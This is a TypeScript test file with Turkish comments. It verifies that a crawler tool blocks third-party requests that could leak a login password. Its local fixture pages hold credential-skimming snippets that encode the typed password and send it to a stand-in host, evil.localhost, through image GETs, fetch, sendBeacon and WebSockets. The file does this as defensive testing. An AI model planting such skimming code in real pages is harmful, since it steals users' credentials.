import { createHash } from 'node:crypto';
import { createServer, type IncomingMessage, type Server } from 'node:http';
import { join } from 'node:path';
import { chromium } from '@playwright/test';
import { afterAll, beforeAll, beforeEach, describe, expect, it, type TestContext, vi } from 'vitest';
import { kesfet, sayfayiYenile } from '../../src/kesif/index.js';
import { geciciDizinAc } from '../yardimci/gecici-dizin.js';

/**
 * Kimlikli bağlamda yabancı çıkış (docs/2026-10-12-kimlikli-baglam-cikis-spec.md §5).
 * Hedef uygulama `app.kobay.localhost`; tek bir yabancı sunucu dört adla dinlenir:
 * - `cdn.localhost`: giriş sayfasının parola yazılmadan önce kullandığı üçüncü taraf (kimlikli
 *   evrede ayrıcalığı yok; §6 Revizyon 1);
 * - `evil.localhost`: hiç görülmemiş üçüncü taraf;
 * - `api.kobay.localhost`: uygulamayla aynı site (izinli);
 * - `auth.localhost`: kullanıcının onayladığı auth origin (izinli, tam origin).
 * `*.localhost` Chromium'da geri döngü adresine çözülür; /etc/hosts gerekmez.
 */
const PAROLA = 'kimlikli-baglam-parola';
const kati = process.env.KOBAY_TEST_STRICT === '1';
let tarayiciEngeli: unknown;

/**
 * Yabancı sunucuya gelen her şey: "ad YÖNTEM yol gövde", "ad UPGRADE yol", "ad WSMSG metin",
 * "ad WSCLOSE kod neden".
 */
const yabanciKayit: string[] = [];
/** Hedef uygulamaya gelen isteklerin yol + sorgusu. */
const hedefKayit: string[] = [];
let yabanci: Server | undefined;
let hedef: Server | undefined;
let hedefUrl = '';
let s3Url = '';
/** Çerezli `/yavas` (keşfin girişten sonraki ilk isteği) başladı mı? */
let girisSonrasiYavas = false;
let cdnUrl = '';
let evilUrl = '';
let apiUrl = '';
let authUrl = '';

/** Sayfa betiklerinin parolayı görünür-parola kuralından kaçırmak için kullandığı kodlama (XOR + base64). */
const KODLA = "const kodla=(v)=>btoa([...v].map((c)=>String.fromCharCode(c.charCodeAt(0)^7)).join(''));";

function kodlu(parola: string): string {
  return Buffer.from([...parola].map((c) => String.fromCharCode(c.charCodeAt(0) ^ 7)).join(''), 'latin1').toString('base64');
}

function dinle(sunucu: Server): Promise<number> {
  return new Promise((coz) => {
    sunucu.listen(0, '127.0.0.1', () => {
      const adres = sunucu.address();
      coz(typeof adres === 'object' && adres !== null ? adres.port : 0);
    });
  });
}

function hostAdi(istek: IncomingMessage): string {
  return (istek.headers.host ?? '').replace(/:\d+$/, '');
}

/** Ortak sabitler: sayfa betiklerinde `CDN`, `EVIL`, `API`, `AUTH` adresleri. */
function sabitler(): string {
  return `<script>const CDN=${JSON.stringify(cdnUrl)},EVIL=${JSON.stringify(evilUrl)},`
    + `API=${JSON.stringify(apiUrl)},AUTH=${JSON.stringify(authUrl)};${KODLA}`
    + 'const ws=(u)=>u.replace(/^http/,"ws");'
    + 'const yaz=(u,g)=>{try{const x=new XMLHttpRequest();x.open("POST",u,false);x.send(g);}catch{}};</script>';
}

/** CDN'den eşzamanlı betik: parola yazılmadan (DOMContentLoaded'dan önce) `cdn.localhost` kullanılır. */
function cdnOnceden(): string {
  return `<script src="${cdnUrl}/lib.js"></script><link rel="stylesheet" href="${cdnUrl}/font.css">`;
}

function girisSayfasi(oncesi: string, gonderimBetigi = '', girdiBetigi = ''): string {
  return `<!doctype html><html><head>${sabitler()}${oncesi}</head><body>`
    + '<form id="f" action="/giris" method="post"><input type="text" name="k"><input type="password" name="p">'
    + '<button type="submit">Log in</button></form><script>const f=document.getElementById("f");'
    + `f.p.addEventListener('input',(e)=>{${girdiBetigi}});`
    + `f.addEventListener('submit',(e)=>{const p=f.p.value;${gonderimBetigi}});</script></body></html>`;
}

function panel(betik: string, govde = ''): string {
  return `<!doctype html><html><head>${sabitler()}</head><body><h1>Panel</h1>${govde}`
    + `<script>if(document.cookie.includes('oturum=1')){${betik}}</script><a href="/son">next</a></body></html>`;
}

const sayfalar: Record<string, (cerezVar: boolean) => string> = {
  // (a) fill sırasında parola kodlanıp saklanır; pencere SONRASI panel onu hiç görülmemiş origin'e GET ile yollar.
  '/a-giris': () => girisSayfasi('', '', "sessionStorage.setItem('x',kodla(e.target.value));"),
  '/a-panel': () => panel("const x=sessionStorage.getItem('x');if(x)fetch(EVIL+'/a?x='+x,{mode:'no-cors'});"),
  // (b) pencere içinde kodlanmış parolalı <img> GET, ardından normal gönderim.
  '/b-giris': () => girisSayfasi(
    '',
    "e.preventDefault();new Image().src=EVIL+'/b?x='+kodla(p);setTimeout(()=>f.submit(),300);",
  ),
  // (c) giriş sonrası POST, sendBeacon ve WebSocket; CDN giriş sayfasında önceden kullanılmış olsa da kesilir.
  '/c-giris': () => girisSayfasi(cdnOnceden()),
  '/c-panel': () => panel(
    "navigator.sendBeacon(CDN+'/c-beacon','olay=1');new WebSocket(ws(CDN)+'/c-ws');new WebSocket(ws(EVIL)+'/c-ws');"
      + "yaz(CDN+'/c-post','olay=1');yaz(EVIL+'/c-post','olay=1');",
  ),
  // (d) giriş sonrası GET: önceden kullanılmış CDN'e de, hiç görülmemiş origin'e de kesilir
  // (eşzamanlı betikler: sayfa onları bekler).
  '/d-giris': () => girisSayfasi(cdnOnceden()),
  '/d-panel': (cerezVar) => `<!doctype html><html><body><h1>Panel</h1>${cerezVar
    ? `<script src="${cdnUrl}/d-veri.js"></script><script src="${evilUrl}/d-veri.js"></script>`
    : ''}</body></html>`,
  // (e) giriş sonrası aynı-site API ve auth origin: yazma ve WebSocket etkilenmez.
  '/e-panel': () => panel("new WebSocket(ws(API)+'/e-ws');yaz(API+'/e-post','olay=1');yaz(AUTH+'/e-post','olay=1');"),
  // Pencere açılmadan önce açılan WebSocket. Bağlantıyı aynı origin'den açılan bir pencere (popup)
  // tutar: keşif ana sayfayı gezerken o pencere bağlam kapanana kadar açık kalır. Giriş sayfası,
  // bağlantı açılıp ilk mesaj gitsin diye yavaş bir eşzamanlı betikle bekletilir.
  '/ws-acik-giris': () => girisSayfasi(`<script>window.open('/ws-penceresi','wsp');</script><script src="/bekle"></script>`),
  // Olay sırası (duvar saati yok): faz çerezden okunur. Giriş sonrası sayfa, sunucuya keşfin
  // girişten sonraki ilk isteğinin (çerezli `/yavas`) başlayıp başlamadığını sorar (`/ws-hazir`);
  // bu istek `denetle`den sonra atıldığı için "evet" gelince koruma kesinlikle giriş sonrası
  // evrededir. O an 'sonra-son' mesajını yollar; ardından gelen ilk 'ping' bağlantının açık
  // olduğunu kanıtlar: durum raporlanır ve bağlantı nedenli (4000, "kod=gizli") kapatılır.
  // Sunucu çerezli `/yavas`'ı kapanış çerçevesi yabancıya ulaşana kadar bekletir.
  '/ws-penceresi': () => `<!doctype html><html><head>${sabitler()}</head><body><h1>WS</h1><script>`
    + "let hazir=false,bitti=false;const faz=()=>document.cookie.includes('oturum=1')?'sonra':'once';"
    + "const w=new WebSocket(ws(CDN)+'/acik-ws');"
    + 'w.onopen=()=>{w.send(faz());setInterval(()=>{if(w.readyState===1&&!bitti)w.send(faz());},100);'
    + "setInterval(()=>{if(hazir||faz()!=='sonra')return;fetch('/ws-hazir').then((r)=>r.text()).then((t)=>{"
    + "if(t==='evet'&&!hazir){hazir=true;w.send('sonra-son');}});},50);};"
    + "w.onmessage=()=>{if(!hazir||bitti)return;bitti=true;"
    + "fetch('/ws-durum?acik='+(w.readyState===1)).finally(()=>w.close(4000,'kod=gizli'));};"
    + '</script></body></html>',
  // Rails ActiveStorage avatarı: giriş sonrası açılan panel avatarı izinli uçtan ister, uç S3
  // kovasına 302 ile yönlendirir (denetçi sondası; 0.4.0'da giriş geçiyordu).
  '/avatar-giris': () => girisSayfasi('').replace('action="/giris"', 'action="/giris-avatar"'),
  '/avatar-panel': () => '<!doctype html><html><body><h1>Panel</h1>'
    + '<img src="/rails/active_storage/blobs/redirect/eyJfcmFpbHMiOnsiZGF0YSI6MX19/avatar.png"></body></html>',
  // Giriş sonrası yabancı belge: iframe ve popup (panelde), ana çerçeve (/h-ana).
  '/h-panel': () => panel(
    "const i=document.createElement('iframe');i.src=EVIL+'/h-iframe';document.body.append(i);window.open(EVIL+'/h-popup');",
    '<a href="/h-ana">main</a>',
  ),
  '/h-ana': () => panel("location.href=EVIL+'/h-ana';"),
  // Giriş sonrası izinli uçtan yabancıya 302 yönlendirilen alt kaynak (kesilemez, yalnız tespit).
  '/r-panel': (cerezVar) => `<!doctype html><html><body><h1>R</h1>${cerezVar ? '<img src="/yonlendir-evil?r=panel">' : ''}</body></html>`,
  // Giriş penceresinde aynı yönlendirme: kesilemez, girişi reddettirmez, uyarıda sayılır.
  '/r-giris': () => girisSayfasi('', "e.preventDefault();new Image().src='/yonlendir-evil?r=giris';setTimeout(()=>f.submit(),300);"),
  // Giriş olmuyor (sayfa yerinde kalır), pencerede kodlanmış parola hiç görülmemiş origin'e GET ile gider.
  '/g-giris': () => girisSayfasi('', "e.preventDefault();new Image().src=EVIL+'/g?x='+kodla(p);"),
  // Giriş olmuyor; pencerede hem GET hem yazma (beacon) kesilir.
  '/g2-giris': () => girisSayfasi('', "e.preventDefault();new Image().src=EVIL+'/g2?x='+kodla(p);navigator.sendBeacon(EVIL+'/g2','olay=1');"),
  // (f) kimliksiz keşif ve geçerli oturumla yenileme: yabancı yazma/GET/WebSocket olduğu gibi gider.
  '/f-sayfa': () => `<!doctype html><html><head>${sabitler()}</head><body><h1>F</h1>`
    + `<script src="${evilUrl}/f-get.js"></script><script>new WebSocket(ws(EVIL)+'/f-ws');yaz(EVIL+'/f-post','olay=1');</script>`
    + '<a href="/son">next</a></body></html>',
};

beforeAll(async () => {
  try {
    const tarayici = await chromium.launch({ headless: true });
    await tarayici.close();
  } catch (hata) {
    tarayiciEngeli = hata;
    return;
  }
  yabanci = createServer((istek, yanit) => {
    let govde = '';
    istek.on('data', (parca: Buffer) => { govde += parca.toString(); });
    istek.on('end', () => {
      yabanciKayit.push(`${hostAdi(istek)} ${istek.method ?? ''} ${istek.url ?? ''} ${govde}`);
      const tur = (istek.url ?? '').includes('.css') ? 'text/css' : 'text/javascript';
      yanit.writeHead(200, { 'content-type': tur, 'access-control-allow-origin': '*' });
      yanit.end('');
    });
  });
  // En küçük WebSocket sunucusu: el sıkışır, maskeli kısa metin çerçevelerini kaydeder.
  yabanci.on('upgrade', (istek: IncomingMessage, soket) => {
    const ad = hostAdi(istek);
    yabanciKayit.push(`${ad} UPGRADE ${istek.url ?? ''}`);
    soket.on('error', () => undefined);
    const anahtar = istek.headers['sec-websocket-key'];
    if (typeof anahtar !== 'string') {
      soket.destroy();
      return;
    }
    const kabul = createHash('sha1').update(`${anahtar}258EAFA5-E914-47DA-95CA-C5AB0DC85B11`).digest('base64');
    soket.write(`HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: ${kabul}\r\n\r\n`);
    // `/acik-ws`: sunucu her 100 ms'de bir 'ping' gönderir (maskesiz kısa metin çerçevesi).
    const ping = istek.url === '/acik-ws'
      ? setInterval(() => { if (!soket.destroyed) soket.write(Buffer.from([0x81, 4, ...Buffer.from('ping')])); }, 100)
      : undefined;
    soket.on('close', () => { clearInterval(ping); });
    let tampon = Buffer.alloc(0);
    soket.on('data', (parca: Buffer) => {
      tampon = Buffer.concat([tampon, parca]);
      while (tampon.length >= 6) {
        const ilk = tampon[0] ?? 0;
        const uzunluk = (tampon[1] ?? 0) & 0x7f;
        if (uzunluk > 125) {
          soket.destroy();
          return;
        }
        if (tampon.length < 6 + uzunluk) break;
        const maske = tampon.subarray(2, 6);
        const veri = Buffer.from(tampon.subarray(6, 6 + uzunluk)).map((bayt, i) => bayt ^ (maske[i % 4] ?? 0));
        tampon = tampon.subarray(6 + uzunluk);
        if ((ilk & 0x0f) === 0x8) {
          // Kapanış çerçevesi: kod (2 bayt) + neden. Kayıt: "ad WSCLOSE kod neden".
          const kapanis = Buffer.from(veri);
          const kod = kapanis.length >= 2 ? kapanis.readUInt16BE(0) : '';
          yabanciKayit.push(`${ad} WSCLOSE ${kod} ${kapanis.subarray(2).toString('utf8')}`.trimEnd());
          soket.end();
          return;
        }
        if ((ilk & 0x0f) === 0x1) yabanciKayit.push(`${ad} WSMSG ${Buffer.from(veri).toString('utf8')}`);
      }
    });
  });
  const yabanciPort = await dinle(yabanci);
  cdnUrl = `http://cdn.localhost:${yabanciPort}`;
  evilUrl = `http://evil.localhost:${yabanciPort}`;
  apiUrl = `http://api.kobay.localhost:${yabanciPort}`;
  authUrl = `http://auth.localhost:${yabanciPort}`;
  s3Url = `http://bucket.s3.localhost:${yabanciPort}`;

  hedef = createServer((istek, yanit) => {
    const yol = new URL(istek.url ?? '/', 'http://x').pathname;
    const cerezVar = (istek.headers.cookie ?? '').includes('oturum=1');
    hedefKayit.push(istek.url ?? '');
    istek.resume();
    istek.on('end', () => {
      const html = (icerik: string): void => {
        yanit.writeHead(200, { 'content-type': 'text/html' });
        yanit.end(icerik);
      };
      if (yol === '/giris' && istek.method === 'POST') {
        yanit.writeHead(302, { location: '/panel', 'set-cookie': 'oturum=1; Path=/' });
        yanit.end();
        return;
      }
      if (yol === '/api-giris' && istek.method === 'POST') {
        yanit.writeHead(200, { 'content-type': 'text/plain', 'set-cookie': 'oturum=1; Path=/' });
        yanit.end('ok');
        return;
      }
      if (yol === '/bekle') {
        setTimeout(() => {
          yanit.writeHead(200, { 'content-type': 'text/javascript' });
          yanit.end('');
        }, 700);
        return;
      }
      if (yol === '/giris-avatar' && istek.method === 'POST') {
        yanit.writeHead(302, { location: '/avatar-panel', 'set-cookie': 'oturum=1; Path=/' });
        yanit.end();
        return;
      }
      if (yol.startsWith('/rails/active_storage/blobs/redirect/')) {
        yanit.writeHead(302, { location: `${s3Url}/avatar.png` });
        yanit.end();
        return;
      }
      if (yol === '/ws-hazir') {
        yanit.writeHead(200, { 'content-type': 'text/plain' });
        yanit.end(girisSonrasiYavas ? 'evet' : 'hayir');
        return;
      }
      if (yol === '/yavas' && cerezVar) {
        // Keşfin girişten sonraki ilk isteği: `/ws-penceresi`nin kapanış çerçevesi yabancıya
        // ulaşana kadar bekletilir (bağlam o ana kadar açık kalır). Emniyet: 4,5 sn'de bırakılır
        // ve bu durum kaydedilir (test onu hata sayar).
        girisSonrasiYavas = true;
        const baslangic = Date.now();
        const bak = (): void => {
          if (yabanciKayit.some((satir) => satir.startsWith('cdn.localhost WSCLOSE'))) {
            html('<!doctype html><h1>Slow</h1>');
          } else if (Date.now() - baslangic > 4_500) {
            hedefKayit.push('/yavas-emniyet-suresi');
            html('<!doctype html><h1>Slow</h1>');
          } else {
            setTimeout(bak, 20);
          }
        };
        bak();
        return;
      }
      if (yol === '/yonlendir-evil') {
        yanit.writeHead(302, { location: `${evilUrl}/r${new URL(istek.url ?? '/', 'http://x').search}` });
        yanit.end();
        return;
      }
      if (yol === '/korumali') {
        if (!cerezVar) {
          yanit.writeHead(302, { location: '/c-giris' });
          yanit.end();
          return;
        }
        html(`<!doctype html><html><head>${sabitler()}</head><body><h1>Protected</h1>`
          + `<script src="${evilUrl}/k-get.js"></script><script>yaz(EVIL+'/k-post','olay=1');</script></body></html>`);
        return;
      }
      const sayfa = sayfalar[yol];
      html(sayfa ? sayfa(cerezVar) : '<!doctype html><html><body><h1>Page</h1></body></html>');
    });
  });
  hedefUrl = `http://app.kobay.localhost:${await dinle(hedef)}`;
});

afterAll(async () => {
  await Promise.all([yabanci, hedef].filter((s): s is Server => s !== undefined)
    .map((sunucu) => new Promise((coz) => { sunucu.closeAllConnections(); sunucu.close(coz); })));
});

let stderrCasusu: ReturnType<typeof vi.spyOn<typeof process.stderr, 'write'>> | undefined;

beforeEach(() => {
  yabanciKayit.length = 0;
  hedefKayit.length = 0;
  girisSonrasiYavas = false;
  stderrCasusu?.mockRestore();
  stderrCasusu = vi.spyOn(process.stderr, 'write').mockImplementation(() => true);
  return () => {
    stderrCasusu?.mockRestore();
    stderrCasusu = undefined;
  };
});

function uyarilar(): string[] {
  return (stderrCasusu?.mock.calls ?? []).map(([metin]) => String(metin))
    .filter((metin) => metin.startsWith('[kobay] Warning:')
      && (metin.includes(' after login') || metin.includes(' during login')));
}

function tarayiciMumkun(context: TestContext): boolean {
  if (!tarayiciEngeli) return true;
  const ozet = String(tarayiciEngeli).split('\n')[0] ?? '';
  if (kati) throw new Error(`KOBAY_TEST_STRICT=1: Gerçek Chromium atlanamaz: ${ozet}`);
  context.skip(`Gerçek Chromium bu ortamda engelli: ${ozet}`);
  return false;
}

interface Deneme { giris?: string; basla?: string; maxSayfa?: number; storage?: string; kimliksiz?: boolean; auth?: boolean }

async function kesifDene(d: Deneme): ReturnType<typeof kesfet> {
  const storage = d.storage ?? join(await geciciDizinAc('kobay-kimlikli-baglam-'), 'storage.json');
  const authOrigins = d.auth === true ? [authUrl] : [];
  return kesfet({
    baseUrl: `${hedefUrl}${d.basla ?? ''}`,
    ...(d.giris === undefined ? {} : { loginUrl: `${hedefUrl}${d.giris}` }),
    ...(d.kimliksiz === true ? {} : {
      kimlik: { username: 'demo', password: PAROLA, origin: hedefUrl, ...(d.auth === true ? { authOrigins } : {}) },
    }),
    authOrigins,
    storageStateYolu: storage,
    maxSayfa: d.maxSayfa ?? 2,
    sayfaZamanAsimiMs: 5_000,
  });
}

/** Kapanan sayfaların yarım kalan bağlantıları sunucuya geç düşebilir: olumsuz iddiadan önce kısa bekleme. */
async function durul(): Promise<void> {
  await new Promise((coz) => { setTimeout(coz, 500); });
}

function evileGiden(): string[] {
  return yabanciKayit.filter((satir) => satir.startsWith('evil.localhost '));
}

function parolaGitti(): boolean {
  return yabanciKayit.some((satir) => satir.includes(PAROLA) || satir.includes(kodlu(PAROLA))
    || satir.includes(encodeURIComponent(kodlu(PAROLA))));
}

describe('kimlikli keşif bağlamı: parola yazıldıktan sonra yabancı çıkış', () => {
  it('(a) fill sırasında kodlanan parola pencere SONRASI hiç görülmemiş origin\'e GET ile gitmez; keşif sürer, uyarı yazılır', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const harita = await kesifDene({ giris: '/a-giris', basla: '/a-panel' });
    expect(harita.loggedIn).toBe(true);
    expect(harita.pages.map((sayfa) => new URL(sayfa.url).pathname)).toContain('/a-panel');
    await durul();
    expect(evileGiden()).toEqual([]);
    expect(parolaGitti()).toBe(false);
    expect(uyarilar()).toHaveLength(1);
    expect(uyarilar()[0]).toContain(evilUrl);
  });

  it('(b) pencere içinde kodlanmış parolalı <img> GET yabancıya düşmez; giriş başarılı', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const harita = await kesifDene({ giris: '/b-giris', maxSayfa: 1 });
    expect(harita.loggedIn).toBe(true);
    await durul();
    expect(evileGiden()).toEqual([]);
    expect(parolaGitti()).toBe(false);
    expect(uyarilar()[0]).toContain(evilUrl);
  });

  it('(c) giriş sonrası POST, sendBeacon ve WebSocket yabancıya düşmez (önceden kullanılmış CDN dahil)', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const harita = await kesifDene({ giris: '/c-giris', basla: '/c-panel', maxSayfa: 3 });
    expect(harita.loggedIn).toBe(true);
    expect(harita.pages.map((sayfa) => new URL(sayfa.url).pathname)).toEqual(expect.arrayContaining(['/c-panel', '/son']));
    await durul();
    // Giriş sayfası CDN'i parola yazılmadan önce kullandı: o GET'ler (lib.js, font.css) meşru.
    expect(yabanciKayit.filter((satir) => !/^cdn\.localhost GET \/(?:lib\.js|font\.css) /.test(satir))).toEqual([]);
    expect(uyarilar()).toHaveLength(1);
    expect(uyarilar()[0]).toMatch(/blocked \d+ third-party requests after login to protect the password: /);
  });

  it('(d) giriş sayfasının parola yazılmadan önce kullandığı CDN\'e de, hiç görülmemiş origin\'e de giriş sonrası GET düşmez', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const harita = await kesifDene({ giris: '/d-giris', basla: '/d-panel' });
    expect(harita.loggedIn).toBe(true);
    expect(harita.pages.map((sayfa) => new URL(sayfa.url).pathname)).toContain('/d-panel');
    await durul();
    // CDN yalnız parola yazılmadan önce (lib.js, font.css) istek aldı.
    expect(yabanciKayit.filter((satir) => !/^cdn\.localhost GET \/(?:lib\.js|font\.css) /.test(satir))).toEqual([]);
    expect(uyarilar()).toHaveLength(1);
    expect(uyarilar()[0]).toContain(cdnUrl);
    expect(uyarilar()[0]).toContain(evilUrl);
    expect(uyarilar()[0]).toContain('Add --auth-origin <origin> for each origin you trust with the password.');
  });

  it('(e) aynı-site API ve auth origin istekleri giriş sonrası etkilenmez; uyarı yok', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const harita = await kesifDene({ giris: '/c-giris', basla: '/e-panel', maxSayfa: 3, auth: true });
    expect(harita.loggedIn).toBe(true);
    expect(yabanciKayit.some((satir) => satir.startsWith('api.kobay.localhost POST /e-post '))).toBe(true);
    expect(yabanciKayit.some((satir) => satir.startsWith('auth.localhost POST /e-post '))).toBe(true);
    await expect.poll(() => yabanciKayit.filter((satir) => satir === 'api.kobay.localhost UPGRADE /e-ws'), { timeout: 3_000 })
      .toHaveLength(1);
    expect(uyarilar()).toEqual([]);
  });

  it('pencere öncesinde açılan WebSocket giriş sonrası AÇIK kalır ama mesajı ve kapanış nedeni yabancıya iletilmez', async (context) => {
    if (!tarayiciMumkun(context)) return;
    // maxSayfa 2: keşif giriş sonrası /yavas'a gider; sunucu onu kapanış çerçevesine kadar bekletir.
    const harita = await kesifDene({ giris: '/ws-acik-giris', basla: '/yavas', maxSayfa: 2 });
    expect(harita.loggedIn).toBe(true);
    expect(harita.pages.map((sayfa) => new URL(sayfa.url).pathname)).toContain('/yavas');
    expect(hedefKayit).not.toContain('/yavas-emniyet-suresi');
    // Bağlantı parola yazılmadan önce kuruldu ve mesaj taşıdı.
    expect(yabanciKayit).toContain('cdn.localhost UPGRADE /acik-ws');
    expect(yabanciKayit).toContain('cdn.localhost WSMSG once');
    // Giriş sonrası evrede bağlantı AÇIKTI (sahte test olmasın): 'sonra-son' giriş sonrası evrede
    // gönderildi ve ondan sonra gelen ping'i sayfa aldı.
    expect(hedefKayit).toContain('/ws-durum?acik=true');
    // Sayfanın kapatması yabancıya ulaştı, ama kodu ve nedeni olmadan.
    const kapanis = yabanciKayit.filter((satir) => satir.startsWith('cdn.localhost WSCLOSE'));
    expect(kapanis).toHaveLength(1);
    expect(kapanis[0]).not.toMatch(/4000|kod=gizli/);
    // Giriş sonrası mesajları yabancıya gitmedi.
    expect(yabanciKayit.filter((satir) => /^cdn\.localhost WSMSG sonra/.test(satir))).toEqual([]);
    expect(uyarilar()[0]).toContain(cdnUrl);
  });

  it('giriş sonrası yabancı belge (iframe, popup, ana çerçeve) yüklenmez', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const harita = await kesifDene({ giris: '/c-giris', basla: '/h-panel', maxSayfa: 4 });
    expect(harita.loggedIn).toBe(true);
    expect(harita.pages.map((sayfa) => new URL(sayfa.url).pathname)).toContain('/h-panel');
    // Keşif ana çerçeveyi yabancıya taşıyan sayfayı da açtı (oturumla).
    expect(hedefKayit).toContain('/h-ana');
    await durul();
    expect(evileGiden()).toEqual([]);
    expect(uyarilar()[0]).toContain(evilUrl);
  });

  it('giriş sonrası izinli uçtan yabancıya yönlendirilen istek kesilemez; uyarıda "via redirect" diye ayrı sayılır', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const harita = await kesifDene({ giris: '/c-giris', basla: '/r-panel' });
    expect(harita.loggedIn).toBe(true);
    // Dürüstlük: Chromium ikinci ayağı route'a uğratmaz; istek yabancıya ULAŞIR.
    await expect.poll(() => evileGiden().some((satir) => satir.startsWith('evil.localhost GET /r?r=panel ')), { timeout: 3_000 })
      .toBe(true);
    expect(uyarilar()).toHaveLength(1);
    expect(uyarilar()[0]).toContain(`1 request reached ${evilUrl} via redirect after login`);
    expect(uyarilar()[0]).not.toMatch(/blocked \d+ third-party/);
  });

  it('giriş penceresinde izinli uçtan yabancıya yönlendirilen alt kaynak girişi reddettirmez; uyarıda "during login" sayılır', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const harita = await kesifDene({ giris: '/r-giris', maxSayfa: 1 });
    expect(harita.loggedIn).toBe(true);
    // Kesilemez: istek yabancıya ulaşır.
    expect(evileGiden().some((satir) => satir.startsWith('evil.localhost GET /r?r=giris '))).toBe(true);
    expect(uyarilar()).toHaveLength(1);
    expect(uyarilar()[0]).toContain(`1 request reached ${evilUrl} via redirect during login`);
  });

  it('regresyon (denetçi sondası): Rails ActiveStorage avatarı S3\'e 302 ile gider, giriş geçer, uyarı yazılır', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const harita = await kesifDene({ giris: '/avatar-giris', maxSayfa: 1 });
    expect(harita.loggedIn).toBe(true);
    expect(hedefKayit.some((yol) => yol.startsWith('/rails/active_storage/blobs/redirect/'))).toBe(true);
    expect(yabanciKayit.some((satir) => satir.startsWith('bucket.s3.localhost GET /avatar.png '))).toBe(true);
    expect(uyarilar()).toHaveLength(1);
    expect(uyarilar()[0]).toContain(`1 request reached ${s3Url} via redirect during login`);
  });

  it('giriş olmazsa pencerede yalnız GET kesildiyse hata yok (exit 5 değil); kesim uyarıda söylenir', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const harita = await kesifDene({ giris: '/g-giris', maxSayfa: 1 });
    expect(harita.loggedIn).toBe(false);
    await durul();
    expect(evileGiden()).toEqual([]);
    expect(uyarilar()[0]).toContain(evilUrl);
    // Giriş tamamlanmadı: uyarı "after login" demez.
    expect(uyarilar()[0]).toContain('during login to protect the password');
    expect(uyarilar()[0]).not.toContain('after login');
  });

  it('giriş olmazsa yazma kesimi hata olur; pencerede kesilen GET hataya ipucu olarak eklenir', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const hata = await kesifDene({ giris: '/g2-giris', maxSayfa: 1 }).then(() => undefined, (neden: unknown) => neden);
    expect(String(hata)).toContain('Login did not complete: during login the page tried to write to a different site');
    expect(String(hata)).toContain(`During login kobay blocked 1 third-party request (${evilUrl}); `
      + `add --auth-origin ${evilUrl} if you trust it with the password.`);
    await durul();
    expect(evileGiden()).toEqual([]);
  });

  it('kimlikli yenileme yeniden giriş yaparsa aynı kurallar işler: yabancı GET ve POST düşmez', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const dizin = await geciciDizinAc('kobay-kimlikli-baglam-');
    const ozet = await sayfayiYenile({
      baseUrl: hedefUrl,
      url: '/korumali',
      loginUrl: `${hedefUrl}/c-giris`,
      storageStateYolu: join(dizin, 'yok.json'),
      kimlik: { username: 'demo', password: PAROLA, origin: hedefUrl },
      sayfaZamanAsimiMs: 5_000,
    });
    expect(new URL(ozet.url).pathname).toBe('/korumali');
    await durul();
    expect(evileGiden()).toEqual([]);
    expect(uyarilar()[0]).toContain(evilUrl);
  });
});

describe('kapsam dışı bağlamlar değişmez (regresyon)', () => {
  it('(f) kimliksiz keşifte yabancı GET, POST ve WebSocket olduğu gibi gider', async (context) => {
    if (!tarayiciMumkun(context)) return;
    await kesifDene({ basla: '/f-sayfa', kimliksiz: true });
    expect(evileGiden().some((satir) => satir.startsWith('evil.localhost GET /f-get.js '))).toBe(true);
    expect(evileGiden().some((satir) => satir.startsWith('evil.localhost POST /f-post '))).toBe(true);
    await expect.poll(() => evileGiden().some((satir) => satir === 'evil.localhost UPGRADE /f-ws'), { timeout: 3_000 })
      .toBe(true);
    expect(uyarilar()).toEqual([]);
  });

  it('(f) kimlik verilse de giriş gerekmeyen (storageState geçerli) yenilemede parola yazılmaz, yabancı trafik gider', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const storage = join(await geciciDizinAc('kobay-kimlikli-baglam-'), 'storage.json');
    // Oturum dosyasını üret: giriş yapılan keşif.
    await kesifDene({ giris: '/c-giris', maxSayfa: 1, storage });
    yabanciKayit.length = 0;
    stderrCasusu?.mockClear();
    const ozet = await sayfayiYenile({
      baseUrl: hedefUrl,
      url: '/korumali',
      loginUrl: `${hedefUrl}/c-giris`,
      storageStateYolu: storage,
      kimlik: { username: 'demo', password: PAROLA, origin: hedefUrl },
      sayfaZamanAsimiMs: 5_000,
    });
    expect(new URL(ozet.url).pathname).toBe('/korumali');
    expect(evileGiden().some((satir) => satir.startsWith('evil.localhost GET /k-get.js '))).toBe(true);
    expect(evileGiden().some((satir) => satir.startsWith('evil.localhost POST /k-post '))).toBe(true);
    expect(uyarilar()).toEqual([]);
  });
});
